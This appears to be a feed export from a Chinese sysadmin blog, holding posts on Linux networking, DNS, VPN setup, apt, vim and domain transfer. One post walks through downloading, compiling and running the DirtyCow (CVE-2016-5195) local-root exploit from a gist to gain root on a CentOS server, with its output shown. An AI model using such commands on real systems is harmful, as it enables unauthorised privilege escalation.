class="variable">$LOCAL_IFNAME</span>"</span> up</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>在 CoreOS 上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x test.sh <span class="comment"># 这句执行一遍即可</span></span><br><span class="line">sudo ./test.sh</span><br></pre></td></tr></table></figure>
<p>最后再</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brctl show brtest</span><br></pre></td></tr></table></figure>
<p>看结果，发现：</p>
<ul>
<li>vethltest${i}（i 为偶数的设备）都被正确添加到 brtest 里</li>
<li>vethltest${i}（i 为奇数的设备）有一些没有被正确添加到 brtest 里</li>
</ul>
<p>结论：</p>
<p>在我所测试的平台（CoreOS）上，Pipework 是有问题的，原因来自于调用的命令 ip（来自于软件包 iproute2）</p>
<h1 id="多说一句"><a href="#多说一句" class="headerlink" title="多说一句"></a>多说一句</h1><p>随后我把测试程序 test.sh 拷贝到一台 CentOS 7 上跑，发现 CentOS 7 没有这个问题。</p>
<h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><p>参考了一些网上的文档：</p>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Network_bridge" target="_blank" rel="noopener">Network bridge</a></li>
</ul>
]]></content>
      <tags>
        <tag>Pipework</tag>
        <tag>CoreOS</tag>
        <tag>docker</tag>
        <tag>ip</tag>
        <tag>brctl</tag>
        <tag>iproute2</tag>
      </tags>
  </entry>
  <entry>
    <title>VIM普通用户保存文件时用sudo获取root权限</title>
    <url>/2017/03/VIM%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6%E6%97%B6%E7%94%A8sudo%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90/index.html</url>
    <content><![CDATA[<p>原文来自于 <a href="http://www.commandlinefu.com/" target="_blank" rel="noopener">commandlinefu</a>，具体链接找不到了。</p>
<p>原文是这样解释这个命令地做用的：在vim中保存正在编辑的文件而不需要必要的权限（Save a file you edited in vim without the needed permissions）。</p>
<a id="more"></a>
<p>下面我们就具体解释一下这条命令是怎样做到保存文件而不需要必要的权限的</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">w</span> !sudo tee %</span><br></pre></td></tr></table></figure>
<p>百分号 (“%”) 代表当前文件名，这条命令的含义是把当前编辑的文件的内容当做标准输入输出到命令 sudo tee 文件名的文件里去，也就是 sudo 保存为当前文件名。<br>这个功能其实可能 Debian 和 Ubuntu 的用户更需要一些，因为我们 RedHat 系都是直接 root 干活儿：）</p>
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Bash</tag>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>一个网卡多通道没打开导致的诡异故障</title>
    <url>/2017/04/%E4%B8%80%E4%B8%AA%E7%BD%91%E5%8D%A1%E5%A4%9A%E9%80%9A%E9%81%93%E6%B2%A1%E6%89%93%E5%BC%80%E5%AF%BC%E8%87%B4%E7%9A%84%E8%AF%A1%E5%BC%82%E6%95%85%E9%9A%9C/index.html</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>某公有云 VPC 环境下的云主机，发现之间有一个非常诡异的问题，就是从 A 到 B ping 不通，但是只要从 B ping 一下 A，发现 B ping A 只要一通，原来的从 A ping 到 B 又都马上通了。</p>
<a id="more"></a>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><p>听包也能明显说明这一点：只要有包从 B 到 A，那么从 A 到 B 马上就通，否则，从 A 到 B，也许永远都不会通！</p>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>最终发现是因为在 B 上的网卡的多队列支持没有打开，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ethtool -l eth0;</span><br></pre></td></tr></table></figure>
<p>显示网络设备 eth0 的 Combined 预设的是 4，但是当前设置的却只是 1。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ethtool -L eth0 combined 4;</span><br></pre></td></tr></table></figure>
<p>之后呢，问题解决。接着发现最直接的原因是因为我们禁掉了一个公有云这边自己搞得一个自启动的服务，那个服务里会去调整网卡的多队列支持。而且为什么要这么一个服务呢，我猜想是因为这个网卡的队列数其实是 libvirtd 虚拟出来的，这个应该是可以跟虚拟机购买的 CPU 核数相适应的，所以一旦服务器升级 CPU，这个多队列的数目马上就会不一样，所以在启动过程中放一个自动调整的步骤，是非常好的策略。</p>
<p>需要注意的是：执行这条命令时最好在控制台登录操作，或者从另外的网卡连上去做操作。因为这个操作会导致被操作的网络设备闪断一下（类似于先 ifdown 再 ifup）</p>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>ethtool</tag>
        <tag>eths</tag>
        <tag>nic</tag>
        <tag>channel</tag>
        <tag>Combined</tag>
      </tags>
  </entry>
  <entry>
    <title>一个从 Phabricator 中抓出任务生成周报的东西</title>
    <url>/2018/08/%E4%B8%80%E4%B8%AA%E4%BB%8E%20Phabricator%20%E4%B8%AD%E6%8A%93%E5%87%BA%E4%BB%BB%E5%8A%A1%E7%94%9F%E6%88%90%E5%91%A8%E6%8A%A5%E7%9A%84%E4%B8%9C%E8%A5%BF/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>自然是我司每周都要完成的周报。</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我司重度依赖“不存在网站”：<a href="https://www.facebook.com" target="_blank" rel="noopener">Facebook</a> 开源出来的项目：<a href="https://www.phacility.com/phabricator/" target="_blank" rel="noopener">Phabricator</a>，我们的每项工作也来自于其中的 Maniphest（不知道是什么语言，不像英语，反正应该就是 task 的意思），每周的工作周报里提到的事情如果有 task 的（一般都有），都还要附上其 task id。</p>
<p>同时，<a href="https://www.phacility.com/phabricator/" target="_blank" rel="noopener">Phabricator</a> 目前的运营公司： <a href="https://www.phacility.com/" target="_blank" rel="noopener">Phacility</a> 同时也放出了一套 php 的类似于 SDK 的东西：<a href="https://github.com/phacility/libphutil" target="_blank" rel="noopener">libphutil</a>，所以我就开始尝试着用 php 来撸一个自动生成、发布周报的东西。</p>
<h1 id="about-Pha-WR-SRE"><a href="#about-Pha-WR-SRE" class="headerlink" title="about Pha_WR_SRE"></a>about Pha_WR_SRE</h1><p><a href="https://github.com/haw-haw/Pha_WR_SRE" target="_blank" rel="noopener">Pha_WR_SRE</a>，<br>不许说项目名称起的很雷人。:(</p>
<p>这个东西怎么做的就不说了，这里主要说下大概实现了哪些功能。</p>
<h2 id="输出的信息"><a href="#输出的信息" class="headerlink" title="输出的信息"></a>输出的信息</h2><p>输出的信息分三种：“completed”、”ongoing” 和 “other”，分别对应着“已完成”、“未完成”和“其他”。</p>
<h2 id="输出的目标"><a href="#输出的目标" class="headerlink" title="输出的目标"></a>输出的目标</h2><p>已实现的是四种：</p>
<ol>
<li>Console</li>
<li>OneNote</li>
<li>Evernote</li>
<li>Phabircator’s Phame</li>
</ol>
<p>第一种就不用说了，如果在控制台运行，运行结果会被直接输出到控制台的；  </p>
<p>第二种也简单，OneNote 支持用 Email 的方式发布 Note，不过需要先在 OneNote 里设置下发邮件的地址白名单（具体见 <a href="https://github.com/haw-haw/Pha_WR_SRE/blob/master/README.md" target="_blank" rel="noopener">README 文件</a>）；  </p>
<p>第三种跟 OneNote 差不多，不过 Evernote 需要一定级别的帐号才支持这种功能，而且他的目标 email 地址是隐藏的，需要自己去找，而且不建议让别人知道；  </p>
<p>第四种是我自己想的，反正 Phabricator 也支持 blog 功能（Phame），不过这个需要先在 Phabricator 中新建一个 blog 获得其的 phid 并配置在 config.ini 中；</p>
<h1 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h1><p>对于用 macOS 的用户，这里还有个特殊的新功能：可以直接设置定时运行这个任务。具体方法就是把项目里那个 .plist.example 文件稍稍修改下（也可以不修改），改名去掉“.example”，放到 ~/Library/LaunchAgents 目录下，然后可以用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load .plist file if U have not change it's name</span></span><br><span class="line">launchctl load gs.theyan.phawrsre.plist;</span><br><span class="line"><span class="comment"># start job manually</span></span><br><span class="line">launchctl launchctl start GenerateReport.job;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>Phabricator</tag>
        <tag>maniphest</tag>
        <tag>task</tag>
        <tag>OneNote</tag>
        <tag>Evernote</tag>
        <tag>phame</tag>
        <tag>macOS</tag>
        <tag>Mojave</tag>
        <tag>launch</tag>
      </tags>
  </entry>
  <entry>
    <title>一次powerdns上某个zone传输失败的问题的解决过程</title>
    <url>/2018/03/%E4%B8%80%E6%AC%A1powerdns%E4%B8%8A%E6%9F%90%E4%B8%AAzone%E4%BC%A0%E8%BE%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>我司用 <a href="https://www.powerdns.com/" target="_blank" rel="noopener">PowerDNS</a> 来维护域名，某天否然发现有纪录在 PowerDNS 已经更新了，但是客户端查询解析结果却迟迟没有更新。</p>
<h1 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h1><h2 id="请求传输数据的一端"><a href="#请求传输数据的一端" class="headerlink" title="请求传输数据的一端"></a>请求传输数据的一端</h2><p>在用做 dns 查询用的服务器上（也是 PowerDNS），执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pdns_control reload;</span><br></pre></td></tr></table></figure>
<p>然后在 log 里看到有错误输出：</p>
<blockquote>
<p>Unable to AXFR zone ‘in-addr.arpa’ from remote ‘1.1.1.1’ (resolver): Remote nameserver closed TCP connection</p>
</blockquote>
<p>(1.1.1.1 是主 DNS 服务器)</p>
<p>看了些文档，说有可能是数据文件太大导致传输失败，于是有直接测试了一下传输 zone：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig <span class="keyword">in</span>-addr.arpa @1.1.1.1 AXFR;</span><br></pre></td></tr></table></figure>
<p>结果发现还是未能得到整个 zone 的数据，于是怀疑服务器端可能有问题。</p>
<h2 id="在传输数据的一端"><a href="#在传输数据的一端" class="headerlink" title="在传输数据的一端"></a>在传输数据的一端</h2><p>在主 DNS 服务器上（这里应该是 1.1.1.1），查看 log，发现有报错误：</p>
<blockquote>
<p>Exception: All data was not consumed<br>TCP Connection Thread died because of STL error: All data was not consumed</p>
</blockquote>
<p>仔细看了下文档，说有可能是待传输的 zone 的数据文件有问题，于是我又做了下检测：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pdnsutil check-zone <span class="keyword">in</span>-addr.arpa;</span><br></pre></td></tr></table></figure>
<p>发现一堆的数据（解析纪录）显然有问题，都备份好，然后删除之。</p>
<p>然后一一回头测试，这回都正常了。</p>
<h1 id="问题根源"><a href="#问题根源" class="headerlink" title="问题根源"></a>问题根源</h1><p>肯定是大家瞎改反向解析（in-addr.arpa）的数据记录导致的。</p>
]]></content>
      <tags>
        <tag>PowerDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>一次本地提权的实战演练</title>
    <url>/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/index.html</url>
    <content><![CDATA[<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>开发同学在线上一台公有云的机器上调试系统环境的时候，把 /etc/security/limits.conf 给改坏了，这是第二次改坏这个文件了，具体怎么改坏的，为什么改坏了会导致不能登录我单独来说（先挖坑），我这里只讲现象，这一次改坏的情况还好，只影响 root 用户，普通用户还能登录。于是就想能不能用普通用户本地提权成 root，再去修复文件 /etc/security/limits.conf </p>
<a id="more"></a>
<h1 id="Howto"><a href="#Howto" class="headerlink" title="Howto"></a>Howto</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget gcc;</span><br><span class="line"><span class="comment"># 安装必需软件</span></span><br><span class="line">su - nagios;</span><br><span class="line"><span class="comment"># 切换成普通用户（nagios）</span></span><br><span class="line">id;</span><br><span class="line"><span class="comment"># 测试用户身份权限</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>uid=500(nagios) gid=500(nagios) groups=500(nagios)</p>
</blockquote>
<p>可以看出用户 nagios 是普通用户（uid 和 gid 都是 500）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp;</span><br><span class="line"><span class="comment"># 危险动作在 /tmp 目录下做比较好</span></span><br><span class="line">wget \</span><br><span class="line">    https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c;</span><br><span class="line"><span class="comment"># 获取 exploit code</span></span><br><span class="line">gcc -pthread c0w.c -o c0w;</span><br><span class="line"><span class="comment"># 编译之</span></span><br><span class="line">./c0w;</span><br><span class="line"><span class="comment"># 执行（exploit code）</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>  (<strong>_)<br>  (o o)___</strong>/<br>   @@ `     \<br>    \ ____, //usr/bin/passwd<br>    //    //<br>    ^^    ^^<br>DirtyCow root privilege escalation<br>Backing up /usr/bin/passwd to /tmp/bak<br>mmap 9c9bf000  </p>
<p>madvise 0  </p>
<p>ptrace 0  </p>
</blockquote>
<p>再执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/passwd;</span><br><span class="line">whoami;id;</span><br></pre></td></tr></table></figure>
<p>系统提示：</p>
<blockquote>
<p>root<br>uid=0(root) gid=500(nagios) groups=0(root),500(nagios)  </p>
</blockquote>
<p>由此可以看出用户已经变成 root（uid 为 0），主组还是 nagios，但同时也已经是 root 组成员</p>
<p>最后，记得把 /tmp/bak 恢复回去成 /usr/bin/passwd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/bak /usr/bin/passwd;</span><br><span class="line">chmod 4755 /usr/bin/passwd;</span><br><span class="line">chown root:root /usr/bin/passwd;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" target="_blank" rel="noopener">CVE-2016-5195 (DirtyCow) Local Root PoC</a></li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>root</tag>
        <tag>DirtyCow</tag>
        <tag>Linux</tag>
        <tag>exploit</tag>
        <tag>2.6.32</tag>
        <tag>Local</tag>
        <tag>C</tag>
        <tag>c0w.c</tag>
      </tags>
  </entry>
  <entry>
    <title>为 iOS 在 CentOS6.x 上搭建 IPSec(PSK+XAuth) VPN 服务器</title>
    <url>/2016/12/%E4%B8%BA-iOS-%E5%9C%A8-CentOS6-x-%E4%B8%8A%E6%90%AD%E5%BB%BA-IPSec-PSK-XAuth-VPN-%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>前面有文章提到过<a href="/2016/10/%E7%BB%99ios10%E5%9C%A8ubuntu-14-04%E4%B8%8A%E9%85%8D%E7%BD%AEipsec%E6%9C%8D%E5%8A%A1%E5%99%A8/">给ios10在ubuntu 14.04上配置IPSec服务器</a>，这里写的是在 CentOS 6.4 环境下的配置。</p>
<p>环境：</p>
<ul>
<li>OpenVZ</li>
<li>CentOS 6.4</li>
<li>2.6.32-042stab120.11</li>
</ul>
<span id="more"></span>

<h1 id="How-to"><a href="#How-to" class="headerlink" title="How to"></a>How to</h1><h2 id="Enable-tun-device"><a href="#Enable-tun-device" class="headerlink" title="Enable tun device"></a>Enable tun device</h2><p>因为这是 OpenVZ 的虚拟机，所以首先要确认系统允许启用 tun 设备。 具体要咨询服务商。</p>
<h2 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kernel</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1;</span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">	<span class="string">&quot;sysctl -w net.ipv4.ip_forward=1&quot;</span> \</span><br><span class="line">	&gt;&gt; /etc/rc.local;</span><br><span class="line"><span class="comment"># firewall</span></span><br><span class="line">iptables -t nat \</span><br><span class="line">	-A POSTROUTING \</span><br><span class="line">	-s 10.0.0.0/8 \</span><br><span class="line">	-o venet0 \</span><br><span class="line">	-j MASQUERADE;</span><br><span class="line">/etc/init.d/iptables save;</span><br></pre></td></tr></table></figure>

<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install \</span><br><span class="line">	strongswan \</span><br><span class="line">	strongswan-libipsec;</span><br></pre></td></tr></table></figure>

<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;/etc/strongswan/ipsec.secrets</span></span><br><span class="line"><span class="string">: PSK sharekeystring</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user1 : XAUTH &quot;password for user1&quot;</span></span><br><span class="line"><span class="string">user2 : XAUTH &quot;password for user2&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;/etc/strongswan/ipsec.conf</span></span><br><span class="line"><span class="string">config setup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">conn %default</span></span><br><span class="line"><span class="string">	ikelifetime=60m</span></span><br><span class="line"><span class="string">	keylife=20m</span></span><br><span class="line"><span class="string">	rekeymargin=3m</span></span><br><span class="line"><span class="string">	keyingtries=1</span></span><br><span class="line"><span class="string">	keyexchange=ikev1</span></span><br><span class="line"><span class="string">	left=%defaultroute</span></span><br><span class="line"><span class="string">	leftsubnet=0.0.0.0/0</span></span><br><span class="line"><span class="string">	leftauth=psk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">conn iOS</span></span><br><span class="line"><span class="string">	right=%any</span></span><br><span class="line"><span class="string">	rightsourceip=10.0.0.0/24</span></span><br><span class="line"><span class="string">	rightauth=psk</span></span><br><span class="line"><span class="string">	rightauth2=xauth</span></span><br><span class="line"><span class="string">	rightdns=8.8.8.8,208.67.220.220,82.200.69.80,4.2.2.2</span></span><br><span class="line"><span class="string">	auto=add</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start service</span></span><br><span class="line">service strongswan restart;</span><br><span class="line">chkconfig strongswan on;</span><br></pre></td></tr></table></figure>

<p>服务器端的工作到此结束。</p>
<h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># manual for /etc/strongswan/ipsec.conf</span></span><br><span class="line">man 5 strongswan_ipsec.conf;</span><br><span class="line"><span class="comment"># manual for /etc/strongswan/ipsec.secrets</span></span><br><span class="line">man 5 strongswan_ipsec.secrets;</span><br><span class="line"><span class="comment"># view service status</span></span><br><span class="line">strongswan statusall;</span><br><span class="line"><span class="comment"># restart service</span></span><br><span class="line">strongswan restart;</span><br></pre></td></tr></table></figure>

<h1 id="iOS-设置"><a href="#iOS-设置" class="headerlink" title="iOS 设置"></a>iOS 设置</h1><p>在 iPhone 上，点击<strong>设置</strong>–&gt;<strong>VPN</strong>–&gt;**添加 VPN 配置…**，然后：</p>
<ul>
<li>类型：IPSec</li>
<li>描述：随便填</li>
<li>服务器：填部署IPSec服务的ip地址或域名</li>
<li>账户：上面的例子中是<em>user1</em>或<em>user2</em></li>
<li>密码：上面的文件里有</li>
<li>使用证书：不使用证书</li>
<li>秘钥：上面配置文件里有（sharekeystring）</li>
</ul>
<h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><p>参考了一些网上的文档：</p>
<ul>
<li><a href="https://www.strongswan.org/testing/testresults/ikev1/xauth-psk/">Test ikev1&#x2F;xauth-psk</a></li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPSec</tag>
        <tag>PSK</tag>
        <tag>OpenVZ</tag>
        <tag>iOS</tag>
        <tag>iPhone</tag>
        <tag>strongSwan</tag>
        <tag>XAuth</tag>
      </tags>
  </entry>
  <entry>
    <title>从GoDaddy迁出域名的正确姿势</title>
    <url>/2016/10/%E4%BB%8EGoDaddy%E8%BF%81%E5%87%BA%E5%9F%9F%E5%90%8D%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/index.html</url>
    <content><![CDATA[<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>为嘛？因为<strong>GoDaddy</strong>的域名续费太黑了，忽悠转进来时低价，一旦到续费的时候，马上翻番。我等忍受不了，立马用脚投票：换地方！比较了一圈儿，貌似<strong><a href="https://www.namesilo.com/?rid=0791741en" target="_blank" rel="noopener">namesilo</a></strong>价钱还比较厚道，于是马上动手：域名迁往<strong><a href="https://www.namesilo.com/?rid=0791741en" target="_blank" rel="noopener">namesilo</a></strong>！</p>
<a id="more"></a>
<h1 id="How-To"><a href="#How-To" class="headerlink" title="How To"></a>How To</h1><h2 id="GoDaddy"><a href="#GoDaddy" class="headerlink" title="GoDaddy"></a>GoDaddy</h2><h3 id="My-Products"><a href="#My-Products" class="headerlink" title="My Products"></a>My Products</h3><ul>
<li>登录<strong><a href="https://www.godaddy.com" target="_blank" rel="noopener">GoDaddy</a></strong></li>
<li>如下图所示进入<strong>My Products</strong>页面<img src="/2016/10/从GoDaddy迁出域名的正确姿势/index/My%20Products.png" title="My Products">
</li>
</ul>
<h3 id="Manage"><a href="#Manage" class="headerlink" title="Manage"></a>Manage</h3><p>点击如下图所示<strong>Manage</strong>按钮：</p>
<img src="/2016/10/从GoDaddy迁出域名的正确姿势/index/Manage.png" title="Manage.png">
<h3 id="Domain-settings"><a href="#Domain-settings" class="headerlink" title="Domain settings"></a>Domain settings</h3><p>再找你要转出域名的方框，如下图所示点击右上角齿轮，选“Domain settings”<br><img src="/2016/10/从GoDaddy迁出域名的正确姿势/index/Domain%20settings.png" title="Domain settings.png"></p>
<h3 id="Additional-Settings"><a href="#Additional-Settings" class="headerlink" title="Additional Settings"></a>Additional Settings</h3><p>再拉到这个页面的下方，看到”Additional Settings”部分，这里面有四个地方（下图红色圆圈圈住的地方）过需要点击：<br><img src="/2016/10/从GoDaddy迁出域名的正确姿势/index/Additional%20Settings.png" title="Additional Settings.png"></p>
<ul>
<li>左下那个”Domain lock”一定要关掉</li>
<li>点击右上的”Transfer domain away from GoDaddy”</li>
<li>点击右下的”Get authorization code”，这个authorization code会发到这个域名的管理邮箱里</li>
<li>左上的红圈里的”Auto renew”这个没关系，最好关上</li>
</ul>
<h2 id="namesilo"><a href="#namesilo" class="headerlink" title="namesilo"></a>namesilo</h2><p>在<strong><a href="https://www.namesilo.com/?rid=0791741en" target="_blank" rel="noopener">namesilo</a></strong>上注册账号，提交transfer你在<strong>GoDaddy</strong>上要转出的域名的申请，注意：需要用到上面获得的Authorization code</p>
<h2 id="Back-to-GoDaddy"><a href="#Back-to-GoDaddy" class="headerlink" title="Back to GoDaddy"></a>Back to GoDaddy</h2><p>像上面那样，进入<strong>My Products</strong>页面后，找到如下图所示叫”Transfers”的Tab<br><img src="/2016/10/从GoDaddy迁出域名的正确姿势/index/Transfers.png" title="Transfers.png"><br>点进去以后，会发现你的域名被请求转出，你需要在点击Accept确认。</p>
<h2 id="Done"><a href="#Done" class="headerlink" title="Done"></a>Done</h2><p>最后的结果：转过来的费用加上一年的托管费再加上一堆免费的服务，所花的价钱仅仅是在GoDaddy续一年费用的一半！</p>
<h1 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h1><p>最后，做个广告：如果您看了我的文章感觉对您有帮助，而您又对<strong><a href="https://www.namesilo.com/?rid=0791741en" target="_blank" rel="noopener">namesilo</a></strong>感兴趣，那么请点击我给的链接（后面带有我的affiliate id，您懂的），谢谢！</p>
<ul>
<li><a href="https://www.namesilo.com/?rid=0791741en" target="_blank" rel="noopener">namesilo首页</a></li>
<li><a href="https://www.namesilo.com/register.php?rid=0791741en" target="_blank" rel="noopener">namesilo搜索页面</a></li>
<li><a href="https://www.namesilo.com/pricing.php?rid=0791741en" target="_blank" rel="noopener">namesilo价格列表</a></li>
</ul>
]]></content>
      <tags>
        <tag>GoDaddy</tag>
        <tag>namesilo</tag>
        <tag>transfer</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>从apt-get出抓取binary-i386/Packages.gz失败的错误说开去</title>
    <url>/2018/05/%E4%BB%8Eapt-get%E5%87%BA%E6%8A%93%E5%8F%96binary-i386-Packages-gz%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%94%99%E8%AF%AF%E8%AF%B4%E5%BC%80%E5%8E%BB/index.html</url>
    <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>服务器上用 <strong>apt-mirror</strong> 来拉取某些软件官方的 <strong>apt</strong> 仓并本地建仓，用于本地服务器的软件安装和更新，这个大概也是众多运维工程师曾经做过的事情吧。</p>
<p>今天我在某一台服务器上做 <strong>apt-get update</strong> 时出错了，系统报 “<a href="http://xxx.xx.xx.xx/xxxxxxxxxxxxxxxxxxx/binary-i386/Packages.gz”" target="_blank" rel="noopener">http://xxx.xx.xx.xx/xxxxxxxxxxxxxxxxxxx/binary-i386/Packages.gz”</a> 抓取失败。xxx.xx.xx.xx 是我自己建的 <strong>apt</strong> 仓，用来服务于内部服务器的，xxxxxxxxxxxxxxxxxxx 正是自建仓的路径，这下面当然没有 <strong>binary-i386</strong> 目录，因为服务器都是 <strong>x86_64</strong> 架构的，应该使用的是目录 <strong>binary-amd64</strong> 才对。</p>
<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>出错的服务器的操作系统是：<em>Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-13-generic x86_64)</em></p>
<ol>
<li>apt 的配置文件里没有关于 i386 的设置</li>
<li>source 里也没有关于 i386 的设置</li>
</ol>
<h1 id="原因简介"><a href="#原因简介" class="headerlink" title="原因简介"></a>原因简介</h1><p><strong>Ubuntu</strong> 的 <strong>amd64</strong> 系统中，<strong>i386</strong> 是作为额外的体系结构被支持的。证据如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --<span class="built_in">print</span>-architecture;dpkg --<span class="built_in">print</span>-foreign-architectures</span><br></pre></td></tr></table></figure>
<p>会输出“amd64”和”i386”。</p>
<p>所以 <strong>apt</strong> 缺省是希望 <strong>apt</strong> 仓也同时能提供 <strong>i386</strong> 的软件包。而我用 <strong>apt-mirror</strong> 建仓时，没有指定同步抓取 <strong>i386</strong> 的软件包，故而当服务器来抓取 <strong>i386</strong> 相关数据时会出错（因为的确没有哇）。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>知道原因了以后解决起来相对就简单了，在 <strong>apt-mirror</strong> 的配置文件 <strong>/etc/apt/mirror.list</strong> 中将想要同步抓取的软件多写一行，用 deb-i386 替换 deb，然后再跑下 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-mirror</span><br></pre></td></tr></table></figure>
<p>就会同时同步 <strong>i386</strong> 的软件包下来，这样客户端 <strong>apt-get</strong> 时就不会有错了。</p>
<h1 id="进阶阅读"><a href="#进阶阅读" class="headerlink" title="进阶阅读"></a>进阶阅读</h1><p>可以让 <strong>x86_64</strong> 系统架构的服务器仅安装 <strong>amd64</strong> 的软件吗？这样 <strong>apt-get</strong> 时也不会去抓群 <strong>i386</strong> 相关的东西了，这样的话也可以避免上面的错误。</p>
<p>回答是：当然可以！</p>
<p>首先，干掉系统现有的所有 <strong>i386</strong> 的软件包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get purge <span class="string">".*:i386"</span></span><br></pre></td></tr></table></figure></p>
<p>接着，将 <strong>i386</strong> 从支持的体系结构里删掉<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --remove-architecture i386</span><br></pre></td></tr></table></figure></p>
<p>这样也可以达到目的！ </p>
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>apt-get</tag>
        <tag>dpkg</tag>
      </tags>
  </entry>
  <entry>
    <title>使用VIM给文件添加密码保护</title>
    <url>/2017/03/%E4%BD%BF%E7%94%A8VIM%E7%BB%99%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E4%BF%9D%E6%8A%A4/index.html</url>
    <content><![CDATA[<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>方案来自于 <a href="http://www.commandlinefu.com/commands/view/2100/add-password-protection-to-a-file-your-editing-in-vim." target="_blank" rel="noopener">Add Password Protection to a file your editing in vim.</a></p>
